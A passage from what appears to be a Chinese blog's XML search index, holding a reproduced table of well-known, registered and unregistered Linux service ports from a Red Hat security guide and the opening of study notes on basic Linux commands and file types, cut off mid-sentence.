            <tag> phpStudy后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux常见端口</title>
      <link href="/2019/09/20/linux-chang-jian-duan-kou/"/>
      <url>/2019/09/20/linux-chang-jian-duan-kou/</url>
      
        <content type="html"><![CDATA[<p>下面的表格中列举了包括在红帽企业 Linux 中的服务、守护进程、和程序所使用的最常见的通信端口。该列表还可以在 <code>/etc/services</code> 文件中找到。要查看由互联网号码分派局（IANA）制定的“著名的已注册动态端口”官方列表。</p><table><thead><tr><th><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://cert.sjtu.edu.cn/doc/linux/stylesheet-images/note.png" alt="注记"></th><th><strong>注记</strong></th></tr></thead><tbody><tr><td></td><td>“<code>*层*</code>”是指服务或协议在交通层上使用 TCP 还是 UDP。若没有列举，这个服务或协议就两者都使用。</td></tr></tbody></table><table><thead><tr><th>端口号码 / 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>1</td><td>tcpmux</td><td>TCP 端口服务多路复用</td></tr><tr><td>5</td><td>rje</td><td>远程作业入口</td></tr><tr><td>7</td><td>echo</td><td>Echo 服务</td></tr><tr><td>9</td><td>discard</td><td>用于连接测试的空服务</td></tr><tr><td>11</td><td>systat</td><td>用于列举连接了的端口的系统状态</td></tr><tr><td>13</td><td>daytime</td><td>给请求主机发送日期和时间</td></tr><tr><td>17</td><td>qotd</td><td>给连接了的主机发送每日格言</td></tr><tr><td>18</td><td>msp</td><td>消息发送协议</td></tr><tr><td>19</td><td>chargen</td><td>字符生成服务；发送无止境的字符流</td></tr><tr><td>20</td><td>ftp-data</td><td>FTP 数据端口</td></tr><tr><td>21</td><td>ftp</td><td>文件传输协议（FTP）端口；有时被文件服务协议（FSP）使用</td></tr><tr><td>22</td><td>ssh</td><td>安全 Shell（SSH）服务</td></tr><tr><td>23</td><td>telnet</td><td>Telnet 服务</td></tr><tr><td>25</td><td>smtp</td><td>简单邮件传输协议（SMTP）</td></tr><tr><td>37</td><td>time</td><td>时间协议</td></tr><tr><td>39</td><td>rlp</td><td>资源定位协议</td></tr><tr><td>42</td><td>nameserver</td><td>互联网名称服务</td></tr><tr><td>43</td><td>nicname</td><td>WHOIS 目录服务</td></tr><tr><td>49</td><td>tacacs</td><td>用于基于 TCP/IP 验证和访问的终端访问控制器访问控制系统</td></tr><tr><td>50</td><td>re-mail-ck</td><td>远程邮件检查协议</td></tr><tr><td>53</td><td>domain</td><td>域名服务（如 BIND）</td></tr><tr><td>63</td><td>whois++</td><td>WHOIS++，被扩展了的 WHOIS 服务</td></tr><tr><td>67</td><td>bootps</td><td>引导协议（BOOTP）服务；还被动态主机配置协议（DHCP）服务使用</td></tr><tr><td>68</td><td>bootpc</td><td>Bootstrap（BOOTP）客户；还被动态主机配置协议（DHCP）客户使用</td></tr><tr><td>69</td><td>tftp</td><td>小文件传输协议（TFTP）</td></tr><tr><td>70</td><td>gopher</td><td>Gopher 互联网文档搜寻和检索</td></tr><tr><td>71</td><td>netrjs-1</td><td>远程作业服务</td></tr><tr><td>72</td><td>netrjs-2</td><td>远程作业服务</td></tr><tr><td>73</td><td>netrjs-3</td><td>远程作业服务</td></tr><tr><td>73</td><td>netrjs-4</td><td>远程作业服务</td></tr><tr><td>79</td><td>finger</td><td>用于用户联系信息的 Finger 服务</td></tr><tr><td>80</td><td>http</td><td>用于万维网（WWW）服务的超文本传输协议（HTTP）</td></tr><tr><td>88</td><td>kerberos</td><td>Kerberos 网络验证系统</td></tr><tr><td>95</td><td>supdup</td><td>Telnet 协议扩展</td></tr><tr><td>101</td><td>hostname</td><td>SRI-NIC 机器上的主机名服务</td></tr><tr><td>102</td><td>iso-tsap</td><td>ISO 开发环境（ISODE）网络应用</td></tr><tr><td>105</td><td>csnet-ns</td><td>邮箱名称服务器；也被 CSO 名称服务器使用</td></tr><tr><td>107</td><td>rtelnet</td><td>远程 Telnet</td></tr><tr><td>109</td><td>pop2</td><td>邮局协议版本2</td></tr><tr><td>110</td><td>pop3</td><td>邮局协议版本3</td></tr><tr><td>111</td><td>sunrpc</td><td>用于远程命令执行的远程过程调用（RPC）协议，被网络文件系统（NFS）使用</td></tr><tr><td>113</td><td>auth</td><td>验证和身份识别协议</td></tr><tr><td>115</td><td>sftp</td><td>安全文件传输协议（SFTP）服务</td></tr><tr><td>117</td><td>uucp-path</td><td>Unix 到 Unix 复制协议（UUCP）路径服务</td></tr><tr><td>119</td><td>nntp</td><td>用于 USENET 讨论系统的网络新闻传输协议（NNTP）</td></tr><tr><td>123</td><td>ntp</td><td>网络时间协议（NTP）</td></tr><tr><td>137</td><td>netbios-ns</td><td>在红帽企业 Linux 中被 Samba 使用的 NETBIOS 名称服务</td></tr><tr><td>138</td><td>netbios-dgm</td><td>在红帽企业 Linux 中被 Samba 使用的 NETBIOS 数据报服务</td></tr><tr><td>139</td><td>netbios-ssn</td><td>在红帽企业 Linux 中被 Samba 使用的NET BIOS 会话服务</td></tr><tr><td>143</td><td>imap</td><td>互联网消息存取协议（IMAP）</td></tr><tr><td>161</td><td>snmp</td><td>简单网络管理协议（SNMP）</td></tr><tr><td>162</td><td>snmptrap</td><td>SNMP 的陷阱</td></tr><tr><td>163</td><td>cmip-man</td><td>通用管理信息协议（CMIP）</td></tr><tr><td>164</td><td>cmip-agent</td><td>通用管理信息协议（CMIP）</td></tr><tr><td>174</td><td>mailq</td><td>MAILQ</td></tr><tr><td>177</td><td>xdmcp</td><td>X 显示管理器控制协议</td></tr><tr><td>178</td><td>nextstep</td><td>NeXTStep 窗口服务器</td></tr><tr><td>179</td><td>bgp</td><td>边界网络协议</td></tr><tr><td>191</td><td>prospero</td><td>Cliffod Neuman 的 Prospero 服务</td></tr><tr><td>194</td><td>irc</td><td>互联网中继聊天（IRC）</td></tr><tr><td>199</td><td>smux</td><td>SNMP UNIX 多路复用</td></tr><tr><td>201</td><td>at-rtmp</td><td>AppleTalk 选路</td></tr><tr><td>202</td><td>at-nbp</td><td>AppleTalk 名称绑定</td></tr><tr><td>204</td><td>at-echo</td><td>AppleTalk echo 服务</td></tr><tr><td>206</td><td>at-zis</td><td>AppleTalk 区块信息</td></tr><tr><td>209</td><td>qmtp</td><td>快速邮件传输协议（QMTP）</td></tr><tr><td>210</td><td>z39.50</td><td>NISO Z39.50 数据库</td></tr><tr><td>213</td><td>ipx</td><td>互联网络分组交换协议（IPX），被 Novell Netware 环境常用的数据报协议</td></tr><tr><td>220</td><td>imap3</td><td>互联网消息存取协议版本3</td></tr><tr><td>245</td><td>link</td><td>LINK</td></tr><tr><td>347</td><td>fatserv</td><td>Fatmen 服务器</td></tr><tr><td>363</td><td>rsvp_tunnel</td><td>RSVP 隧道</td></tr><tr><td>369</td><td>rpc2portmap</td><td>Coda 文件系统端口映射器</td></tr><tr><td>370</td><td>codaauth2</td><td>Coda 文件系统验证服务</td></tr><tr><td>372</td><td>ulistproc</td><td>UNIX Listserv</td></tr><tr><td>389</td><td>ldap</td><td>轻型目录存取协议（LDAP）</td></tr><tr><td>427</td><td>svrloc</td><td>服务位置协议（SLP）</td></tr><tr><td>434</td><td>mobileip-agent</td><td>可移互联网协议（IP）代理</td></tr><tr><td>435</td><td>mobilip-mn</td><td>可移互联网协议（IP）管理器</td></tr><tr><td>443</td><td>https</td><td>安全超文本传输协议（HTTP）</td></tr><tr><td>444</td><td>snpp</td><td>小型网络分页协议</td></tr><tr><td>445</td><td>microsoft-ds</td><td>通过 TCP/IP 的服务器消息块（SMB）</td></tr><tr><td>464</td><td>kpasswd</td><td>Kerberos 口令和钥匙改换服务</td></tr><tr><td>468</td><td>photuris</td><td>Photuris 会话钥匙管理协议</td></tr><tr><td>487</td><td>saft</td><td>简单不对称文件传输（SAFT）协议</td></tr><tr><td>488</td><td>gss-http</td><td>用于 HTTP 的通用安全服务（GSS）</td></tr><tr><td>496</td><td>pim-rp-disc</td><td>用于协议独立的多址传播（PIM）服务的会合点发现（RP-DISC）</td></tr><tr><td>500</td><td>isakmp</td><td>互联网安全关联和钥匙管理协议（ISAKMP）</td></tr><tr><td>535</td><td>iiop</td><td>互联网内部对象请求代理协议（IIOP）</td></tr><tr><td>538</td><td>gdomap</td><td>GNUstep 分布式对象映射器（GDOMAP）</td></tr><tr><td>546</td><td>dhcpv6-client</td><td>动态主机配置协议（DHCP）版本6客户</td></tr><tr><td>547</td><td>dhcpv6-server</td><td>动态主机配置协议（DHCP）版本6服务</td></tr><tr><td>554</td><td>rtsp</td><td>实时流播协议（RTSP）</td></tr><tr><td>563</td><td>nntps</td><td>通过安全套接字层的网络新闻传输协议（NNTPS）</td></tr><tr><td>565</td><td>whoami</td><td>whoami</td></tr><tr><td>587</td><td>submission</td><td>邮件消息提交代理（MSA）</td></tr><tr><td>610</td><td>npmp-local</td><td>网络外设管理协议（NPMP）本地 / 分布式排队系统（DQS）</td></tr><tr><td>611</td><td>npmp-gui</td><td>网络外设管理协议（NPMP）GUI / 分布式排队系统（DQS）</td></tr><tr><td>612</td><td>hmmp-ind</td><td>HMMP 指示 / DQS</td></tr><tr><td>631</td><td>ipp</td><td>互联网打印协议（IPP）</td></tr><tr><td>636</td><td>ldaps</td><td>通过安全套接字层的轻型目录访问协议（LDAPS）</td></tr><tr><td>674</td><td>acap</td><td>应用程序配置存取协议（ACAP）</td></tr><tr><td>694</td><td>ha-cluster</td><td>用于带有高可用性的群集的心跳服务</td></tr><tr><td>749</td><td>kerberos-adm</td><td>Kerberos 版本5（v5）的“kadmin”数据库管理</td></tr><tr><td>750</td><td>kerberos-iv</td><td>Kerberos 版本4（v4）服务</td></tr><tr><td>765</td><td>webster</td><td>网络词典</td></tr><tr><td>767</td><td>phonebook</td><td>网络电话簿</td></tr><tr><td>873</td><td>rsync</td><td>rsync 文件传输服务</td></tr><tr><td>992</td><td>telnets</td><td>通过安全套接字层的 Telnet（TelnetS）</td></tr><tr><td>993</td><td>imaps</td><td>通过安全套接字层的互联网消息存取协议（IMAPS）</td></tr><tr><td>994</td><td>ircs</td><td>通过安全套接字层的互联网中继聊天（IRCS）</td></tr><tr><td>995</td><td>pop3s</td><td>通过安全套接字层的邮局协议版本3（POPS3）</td></tr></tbody></table><p><strong>表 C-1. 著名端口</strong></p><p>以下端口是 UNIX 特有的，涉及了从电子邮件到验证不等的服务。在方括号内的名称（如 [<code>*service*</code>]）是服务的守护进程名称或它的常用别名。</p><table><thead><tr><th>端口号码 / 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>512/tcp</td><td>exec</td><td>用于对远程执行的进程进行验证</td></tr><tr><td>512/udp</td><td>biff [comsat]</td><td>异步邮件客户（biff）和服务（comsat）</td></tr><tr><td>513/tcp</td><td>login</td><td>远程登录（rlogin）</td></tr><tr><td>513/udp</td><td>who [whod]</td><td>登录的用户列表</td></tr><tr><td>514/tcp</td><td>shell [cmd]</td><td>不必登录的远程 shell（rshell）和远程复制（rcp）</td></tr><tr><td>514/udp</td><td>syslog</td><td>UNIX 系统日志服务</td></tr><tr><td>515</td><td>printer [spooler]</td><td>打印机（lpr）假脱机</td></tr><tr><td>517/udp</td><td>talk</td><td>远程对话服务和客户</td></tr><tr><td>518/udp</td><td>ntalk</td><td>网络交谈（ntalk），远程对话服务和客户</td></tr><tr><td>519</td><td>utime [unixtime]</td><td>UNIX 时间协议（utime）</td></tr><tr><td>520/tcp</td><td>efs</td><td>扩展文件名服务器（EFS）</td></tr><tr><td>520/udp</td><td>router [route, routed]</td><td>选路信息协议（RIP）</td></tr><tr><td>521</td><td>ripng</td><td>用于互联网协议版本6（IPv6）的选路信息协议</td></tr><tr><td>525</td><td>timed [timeserver]</td><td>时间守护进程（timed）</td></tr><tr><td>526/tcp</td><td>tempo [newdate]</td><td>Tempo</td></tr><tr><td>530/tcp</td><td>courier [rpc]</td><td>Courier 远程过程调用（RPC）协议</td></tr><tr><td>531/tcp</td><td>conference [chat]</td><td>互联网中继聊天</td></tr><tr><td>532</td><td>netnews</td><td>Netnews</td></tr><tr><td>533/udp</td><td>netwall</td><td>用于紧急广播的 Netwall</td></tr><tr><td>540/tcp</td><td>uucp [uucpd]</td><td>Unix 到 Unix 复制服务</td></tr><tr><td>543/tcp</td><td>klogin</td><td>Kerberos 版本5（v5）远程登录</td></tr><tr><td>544/tcp</td><td>kshell</td><td>Kerberos 版本5（v5）远程 shell</td></tr><tr><td>548</td><td>afpovertcp</td><td>通过传输控制协议（TCP）的 Appletalk 文件编制协议（AFP）</td></tr><tr><td>556</td><td>remotefs [rfs_server, rfs]</td><td>Brunhoff 的远程文件系统（RFS）</td></tr></tbody></table><p><strong>表 C-2. UNIX 特有的端口</strong></p><p><a href="http://cert.sjtu.edu.cn/doc/linux/ch-ports.html#TB-PORTS-REGGED" target="_blank" rel="noopener">表 C-3</a>列举了由网络和软件社区向 IANA 提交的要在端口号码列表中正式注册的端口。</p><table><thead><tr><th>端口号码 / 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>1080</td><td>socks</td><td>SOCKS 网络应用程序代理服务</td></tr><tr><td>1236</td><td>bvcontrol [rmtcfg]</td><td>Garcilis Packeten 远程配置服务器<a href="http://cert.sjtu.edu.cn/doc/linux/ch-ports.html#FTN.AEN5208" target="_blank" rel="noopener">[a]</a></td></tr><tr><td>1300</td><td>h323hostcallsc</td><td>H.323 电话会议主机电话安全</td></tr><tr><td>1433</td><td>ms-sql-s</td><td>Microsoft SQL 服务器</td></tr><tr><td>1434</td><td>ms-sql-m</td><td>Microsoft SQL 监视器</td></tr><tr><td>1494</td><td>ica</td><td>Citrix ICA 客户</td></tr><tr><td>1512</td><td>wins</td><td>Microsoft Windows 互联网名称服务器</td></tr><tr><td>1524</td><td>ingreslock</td><td>Ingres 数据库管理系统（DBMS）锁定服务</td></tr><tr><td>1525</td><td>prospero-np</td><td>无特权的 Prospero</td></tr><tr><td>1645</td><td>datametrics [old-radius]</td><td>Datametrics / 从前的 radius 项目</td></tr><tr><td>1646</td><td>sa-msg-port [oldradacct]</td><td>sa-msg-port / 从前的 radacct 项目</td></tr><tr><td>1649</td><td>kermit</td><td>Kermit 文件传输和管理服务</td></tr><tr><td>1701</td><td>l2tp [l2f]</td><td>第2层隧道服务（LT2P） / 第2层转发（L2F）</td></tr><tr><td>1718</td><td>h323gatedisc</td><td>H.323 电讯守门装置发现机制</td></tr><tr><td>1719</td><td>h323gatestat</td><td>H.323 电讯守门装置状态</td></tr><tr><td>1720</td><td>h323hostcall</td><td>H.323 电讯主持电话设置</td></tr><tr><td>1758</td><td>tftp-mcast</td><td>小文件 FTP 组播</td></tr><tr><td>1759</td><td>mtftp</td><td>组播小文件 FTP（MTFTP）</td></tr><tr><td>1789</td><td>hello</td><td>Hello 路由器通信端口</td></tr><tr><td>1812</td><td>radius</td><td>Radius 拨号验证和记帐服务</td></tr><tr><td>1813</td><td>radius-acct</td><td>Radius 记帐</td></tr><tr><td>1911</td><td>mtp</td><td>Starlight 网络多媒体传输协议（MTP）</td></tr><tr><td>1985</td><td>hsrp</td><td>Cisco 热备用路由器协议</td></tr><tr><td>1986</td><td>licensedaemon</td><td>Cisco 许可管理守护进程</td></tr><tr><td>1997</td><td>gdp-port</td><td>Cisco 网关发现协议（GDP）</td></tr><tr><td>2049</td><td>nfs [nfsd]</td><td>网络文件系统（NFS）</td></tr><tr><td>2102</td><td>zephyr-srv</td><td>Zephyr 通知传输和发送服务器</td></tr><tr><td>2103</td><td>zephyr-clt</td><td>Zephyr serv-hm 连接</td></tr><tr><td>2104</td><td>zephyr-hm</td><td>Zephyr 主机管理器</td></tr><tr><td>2401</td><td>cvspserver</td><td>并行版本系统（CVS）客户 / 服务器操作</td></tr><tr><td>2430/tcp</td><td>venus</td><td>用于 Coda 文件系统（codacon 端口）的 Venus 缓存管理器</td></tr><tr><td>2430/udp</td><td>venus</td><td>用于 Coda 文件系统（callback/wbc interface 界面）的 Venus 缓存管理器</td></tr><tr><td>2431/tcp</td><td>venus-se</td><td>Venus 传输控制协议（TCP）的副作用</td></tr><tr><td>2431/udp</td><td>venus-se</td><td>Venus 用户数据报协议（UDP）的副作用</td></tr><tr><td>2432/udp</td><td>codasrv</td><td>Coda 文件系统服务器端口</td></tr><tr><td>2433/tcp</td><td>codasrv-se</td><td>Coda 文件系统 TCP 副作用</td></tr><tr><td>2433/udp</td><td>codasrv-se</td><td>Coda 文件系统 UDP SFTP 副作用</td></tr><tr><td>2600</td><td>hpstgmgr [zebrasrv]</td><td>HPSTGMGR；Zebra 选路<a href="http://cert.sjtu.edu.cn/doc/linux/ch-ports.html#FTN.AEN5355" target="_blank" rel="noopener">[b]</a></td></tr><tr><td>2601</td><td>discp-client [zebra]</td><td>discp 客户；Zebra 集成的 shell</td></tr><tr><td>2602</td><td>discp-server [ripd]</td><td>discp 服务器；选路信息协议守护进程（ripd）</td></tr><tr><td>2603</td><td>servicemeter [ripngd]</td><td>服务计量；用于 IPv6 的 RIP 守护进程</td></tr><tr><td>2604</td><td>nsc-ccs [ospfd]</td><td>NSC CCS；开放式短路径优先守护进程（ospfd）</td></tr><tr><td>2605</td><td>nsc-posa</td><td>NSC POSA；边界网络协议守护进程（bgpd）</td></tr><tr><td>2606</td><td>netmon [ospf6d]</td><td>Dell Netmon；用于 IPv6 的 OSPF 守护进程（ospf6d）</td></tr><tr><td>2809</td><td>corbaloc</td><td>公共对象请求代理体系（CORBA）命名服务定位器</td></tr><tr><td>3130</td><td>icpv2</td><td>互联网缓存协议版本2（v2）；被 Squid 代理缓存服务器使用</td></tr><tr><td>3306</td><td>mysql</td><td>MySQL 数据库服务</td></tr><tr><td>3346</td><td>trnsprntproxy</td><td>Trnsprnt 代理</td></tr><tr><td>4011</td><td>pxe</td><td>执行前环境（PXE）服务</td></tr><tr><td>4321</td><td>rwhois</td><td>远程 Whois（rwhois）服务</td></tr><tr><td>4444</td><td>krb524</td><td>Kerberos 版本5（v5）到版本4（v4）门票转换器</td></tr><tr><td>5002</td><td>rfe</td><td>无射频以太网（RFE）音频广播系统</td></tr><tr><td>5308</td><td>cfengine</td><td>配置引擎（Cfengine）</td></tr><tr><td>5999</td><td>cvsup [CVSup]</td><td>CVSup 文件传输和更新工具</td></tr><tr><td>6000</td><td>x11 [X]</td><td>X 窗口系统服务</td></tr><tr><td>7000</td><td>afs3-fileserver</td><td>Andrew 文件系统（AFS）文件服务器</td></tr><tr><td>7001</td><td>afs3-callback</td><td>用于给缓存管理器回电的 AFS 端口</td></tr><tr><td>7002</td><td>afs3-prserver</td><td>AFS 用户和组群数据库</td></tr><tr><td>7003</td><td>afs3-vlserver</td><td>AFS 文件卷位置数据库</td></tr><tr><td>7004</td><td>afs3-kaserver</td><td>AFS Kerberos 验证服务</td></tr><tr><td>7005</td><td>afs3-volser</td><td>AFS 文件卷管理服务器</td></tr><tr><td>7006</td><td>afs3-errors</td><td>AFS 错误解释服务</td></tr><tr><td>7007</td><td>afs3-bos</td><td>AFS 基本监查进程</td></tr><tr><td>7008</td><td>afs3-update</td><td>AFS 服务器到服务器更新器</td></tr><tr><td>7009</td><td>afs3-rmtsys</td><td>AFS 远程缓存管理器服务</td></tr><tr><td>9876</td><td>sd</td><td>会话指引器</td></tr><tr><td>10080</td><td>amanda</td><td>高级 Maryland 自动网络磁盘归档器（Amanda）备份服务</td></tr><tr><td>11371</td><td>pgpkeyserver</td><td>良好隐私（PGP） / GNU 隐私卫士（GPG）公钥服务器</td></tr><tr><td>11720</td><td>h323callsigalt</td><td>H.323 调用信号交替</td></tr><tr><td>13720</td><td>bprd</td><td>Veritas NetBackup 请求守护进程（bprd）</td></tr><tr><td>13721</td><td>bpdbm</td><td>Veritas NetBackup 数据库管理器（bpdbm）</td></tr><tr><td>13722</td><td>bpjava-msvc</td><td>Veritas NetBackup Java / Microsoft Visual C++ (MSVC) 协议</td></tr><tr><td>13724</td><td>vnetd</td><td>Veritas 网络工具</td></tr><tr><td>13782</td><td>bpcd</td><td>Vertias NetBackup</td></tr><tr><td>13783</td><td>vopied</td><td>Veritas VOPIED 协议</td></tr><tr><td>22273</td><td>wnn6 [wnn4]</td><td>假名/汉字转换系统<a href="http://cert.sjtu.edu.cn/doc/linux/ch-ports.html#FTN.AEN5510" target="_blank" rel="noopener">[c]</a></td></tr><tr><td>26000</td><td>quake</td><td>Quake（以及相关的）多人游戏服务器</td></tr><tr><td>26208</td><td>wnn6-ds</td><td></td></tr><tr><td>33434</td><td>traceroute</td><td>Traceroute 网络跟踪工具</td></tr><tr><td>注: a. <code>/etc/services</code> 中的注释如下：端口1236被注册为“bvcontrol”，但是它也被 Gracilis Packeten 远程配置服务器使用。正式名称被列为主要名称，未注册的名称被列为别名。 b. 在 <code>/etc/services</code> 中的注释：端口 2600 到 2606 被 zebra 软件包未经注册而使用。主要名称是被注册的名称，被 zebra 使用的未注册名称被列为别名。 c. <code>/etc/services</code> 文件中的注释：该端口被注册为 wnn6，但是还在 FreeWnn 软件包中使用了未注册的“wnn4”。</td><td></td><td></td></tr></tbody></table><p><strong>表 C-3. 注册的端口</strong></p><p><a href="http://cert.sjtu.edu.cn/doc/linux/ch-ports.html#TB-PORTS-DATAGRAM" target="_blank" rel="noopener">表 C-4</a>显示了一个和数据报传递协议（DDP）有关的端口列表。DDP 在 AppleTalk 网络上被使用。</p><table><thead><tr><th>端口号码 / 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>1/ddp</td><td>rtmp</td><td>路由表管理协议</td></tr><tr><td>2/ddp</td><td>nbp</td><td>名称绑定协议</td></tr><tr><td>4/ddp</td><td>echo</td><td>AppleTalk Echo 协议</td></tr><tr><td>6/ddp</td><td>zip</td><td>区块信息协议</td></tr></tbody></table><p><strong>表 C-4. 数据报传递协议端口</strong></p><p><a href="http://cert.sjtu.edu.cn/doc/linux/ch-ports.html#TB-PORTS-KERBEROS" target="_blank" rel="noopener">表 C-5</a>是和 Kerberos 网络验证协议相关的端口列表。在标记的地方，v5 代表 Kerberos 版本5协议。注意，这些端口没有在 IANA 注册。</p><table><thead><tr><th>端口号码 / 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>751</td><td>kerberos_master</td><td>Kerberos 验证</td></tr><tr><td>752</td><td>passwd_server</td><td>Kerberos 口令（kpasswd）服务器</td></tr><tr><td>754</td><td>krb5_prop</td><td>Kerberos v5 从属传播</td></tr><tr><td>760</td><td>krbupdate [kreg]</td><td>Kerberos 注册</td></tr><tr><td>1109</td><td>kpop</td><td>Kerberos 邮局协议（KPOP）</td></tr><tr><td>2053</td><td>knetd</td><td>Kerberos 多路分用器</td></tr><tr><td>2105</td><td>eklogin</td><td>Kerberos v5 加密的远程登录（rlogin）</td></tr></tbody></table><p><strong>表 C-5. Kerberos（工程 Athena/MIT）端口</strong></p><p><a href="http://cert.sjtu.edu.cn/doc/linux/ch-ports.html#TB-PORTS-UNREGGED" target="_blank" rel="noopener">表 C-6</a>是一个未注册的端口列表。这些端口可能被安装在你的红帽企业 Linux 系统上的服务或协议使用，或者它们是在红帽企业 Linux 和运行其它操作系统的机器通信所必需的端口。</p><table><thead><tr><th>端口号码 / 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>15/tcp</td><td>netstat</td><td>网络状态（netstat）</td></tr><tr><td>98/tcp</td><td>linuxconf</td><td>Linuxconf Linux 管理工具</td></tr><tr><td>106</td><td>poppassd</td><td>邮局协议口令改变守护进程（POPPASSD）</td></tr><tr><td>465/tcp</td><td>smtps</td><td>通过安全套接字层的简单邮件传输协议（SMTPS）</td></tr><tr><td>616/tcp</td><td>gii</td><td>使用网关的（选路守护进程）互动界面</td></tr><tr><td>808</td><td>omirr [omirrd]</td><td>联机镜像（Omirr）文件镜像服务</td></tr><tr><td>871/tcp</td><td>supfileserv</td><td>软件升级协议（SUP）服务器</td></tr><tr><td>901/tcp</td><td>swat</td><td>Samba 万维网管理工具（SWAT）</td></tr><tr><td>953</td><td>rndc</td><td>Berkeley 互联网名称域版本9（BIND 9）远程名称守护进程配置工具</td></tr><tr><td>1127</td><td>sufiledbg</td><td>软件升级协议（SUP）调试</td></tr><tr><td>1178/tcp</td><td>skkserv</td><td>简单假名到汉字（SKK）日文输入服务器</td></tr><tr><td>1313/tcp</td><td>xtel</td><td>法国 Minitel 文本信息系统</td></tr><tr><td>1529/tcp</td><td>support [prmsd, gnatsd]</td><td>GNATS 错误跟踪系统</td></tr><tr><td>2003/tcp</td><td>cfinger</td><td>GNU Finger 服务</td></tr><tr><td>2150</td><td>ninstall</td><td>网络安装服务</td></tr><tr><td>2988</td><td>afbackup</td><td>afbackup 客户-服务器备份系统</td></tr><tr><td>3128/tcp</td><td>squid</td><td>Squid 万维网代理缓存</td></tr><tr><td>3455</td><td>prsvp</td><td>RSVP 端口</td></tr><tr><td>5432</td><td>postgres</td><td>PostgreSQL 数据库</td></tr><tr><td>4557/tcp</td><td>fax</td><td>FAX 传输服务（旧服务）</td></tr><tr><td>4559/tcp</td><td>hylafax</td><td>HylaFAX 客户-服务器协议（新服务）</td></tr><tr><td>5232</td><td>sgi-dgl</td><td>SGI 分布式图形库</td></tr><tr><td>5354</td><td>noclog</td><td>NOCOL 网络操作中心记录守护进程（noclogd）</td></tr><tr><td>5355</td><td>hostmon</td><td>NOCOL 网络操作中心主机监视</td></tr><tr><td>5680/tcp</td><td>canna</td><td>Canna 日文字符输入界面</td></tr><tr><td>6010/tcp</td><td>x11-ssh-offset</td><td>安全 Shell（SSH）X11 转发偏移</td></tr><tr><td>6667</td><td>ircd</td><td>互联网中继聊天守护进程（ircd）</td></tr><tr><td>7100/tcp</td><td>xfs</td><td>X 字体服务器（XFS）</td></tr><tr><td>7666/tcp</td><td>tircproxy</td><td>Tircproxy IRC 代理服务</td></tr><tr><td>8008</td><td>http-alt</td><td>超文本传输协议（HTTP）的另一选择</td></tr><tr><td>8080</td><td>webcache</td><td>万维网（WWW）缓存服务</td></tr><tr><td>8081</td><td>tproxy</td><td>透明代理</td></tr><tr><td>9100/tcp</td><td>jetdirect [laserjet, hplj]</td><td>Hewlett-Packard (HP) JetDirect 网络打印服务</td></tr><tr><td>9359</td><td>mandelspawn [mandelbrot]</td><td>用于 X 窗口系统的并行 Mandelbrot 生成程序</td></tr><tr><td>10081</td><td>kamanda</td><td>使用 Kerberos 的 Amanda 备份服务</td></tr><tr><td>10082/tcp</td><td>amandaidx</td><td>Amanda 备份服务</td></tr><tr><td>10083/tcp</td><td>amidxtape</td><td>Amanda 备份服务</td></tr><tr><td>20011</td><td>isdnlog</td><td>综合业务数字网（ISDN）登录系统</td></tr><tr><td>20012</td><td>vboxd</td><td>ISDN 音箱守护进程（vboxd）</td></tr><tr><td>22305/tcp</td><td>wnn4_Kr</td><td>kWnn 韩文输入系统</td></tr><tr><td>22289/tcp</td><td>wnn4_Cn</td><td>cWnn 中文输入系统</td></tr><tr><td>22321/tcp</td><td>wnn4_Tw</td><td>tWnn 中文输入系统（台湾）</td></tr><tr><td>24554</td><td>binkp</td><td>Binkley TCP/IP Fidonet 邮寄程序守护进程</td></tr><tr><td>27374</td><td>asp</td><td>地址搜索协议</td></tr><tr><td>60177</td><td>tfido</td><td>Ifmail FidoNet 兼容邮寄服务</td></tr><tr><td>60179</td><td>fido</td><td>FidoNet 电子邮件和新闻网络</td></tr></tbody></table><blockquote><p><a href="http://cert.sjtu.edu.cn/doc/linux/index.html" target="_blank" rel="noopener">红帽企业linux3安全指南</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux部分常用命令学习记录</title>
      <link href="/2019/09/20/linux-bu-fen-chang-yong-ming-ling-xue-xi-ji-lu/"/>
      <url>/2019/09/20/linux-bu-fen-chang-yong-ming-ling-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>Linux部分常用命令</p><p>ls 显示目标列表</p><p>ls -a 显示所有档案及目录（ls内定将档案名或目录名称为“.”的视为影藏，不会列出）；</p><p>ls -l 以长格式显示目录下的内容列表。输出的信息从左到右依次包括文件名，文件类型、权限模式、硬连接数、所有者、组、文件大小和文件的最后修改时间等；</p><p><a href="https://blog.csdn.net/bearcatfly/article/details/54617095" target="_blank" rel="noopener">https://blog.csdn.net/bearcatfly/article/details/54617095</a> 所有者、群组、其他人概念</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/640.png" alt="img">普通文件类型 </p><p>Linux中最多的一种文件类型, 包括 纯文本文件(ASCII)；二进制文件(binary)；数据格式的文件(data);各种压缩文件.第一个属性为 [-] </p><ul><li><p>目录文件<br>就是目录， 能用 # cd 命令进入的。第一个属性为 [d]，例如 [d rwx rwx rwx]</p></li><li><p>管理文件<br>FIFO也是一种特殊的文件类型，它主要的目的是，解决多个程序同时存取一个文件所造成的错误。FIFO是first-in-first-out(先进先出)的缩写。第一个属性为 [p]<br>链接文件<br>类似Windows下面的快捷方式。第一个属性为 [l]，例如 [lrwxrwxrwx]<br>块设备文件<br>块设备文件 ：就是存储数据以供系统存取的接口设备，简单而言就是硬盘。例如一号硬盘的代码是 /dev/hda1等文件。第一个属性为 